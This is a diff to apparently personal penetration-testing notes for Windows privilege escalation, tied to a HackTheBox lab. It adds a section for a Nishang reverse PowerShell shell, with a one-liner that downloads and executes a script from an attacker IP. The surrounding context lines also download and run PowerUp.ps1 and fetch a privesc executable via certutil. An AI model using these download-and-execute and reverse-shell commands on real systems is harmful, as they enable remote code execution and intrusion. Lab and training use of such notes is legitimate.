@@ -43,6 +43,12 @@ echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/PowerUp.ps1
 certutil -urlcache -split -f http://192.168.119.199/windows-privesc-check2.exe
 ```
 
+### Reverse powershell using Nishang
+```
+cp ~/post-exploit/nishang/Shells/Invoke-PowerShellTcp.ps1 ~/HTB/chatterbox/
+powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.14.3/shell')"
+```
+
 ### Check permission
 ```
 Get-ACL administrator | Fl *
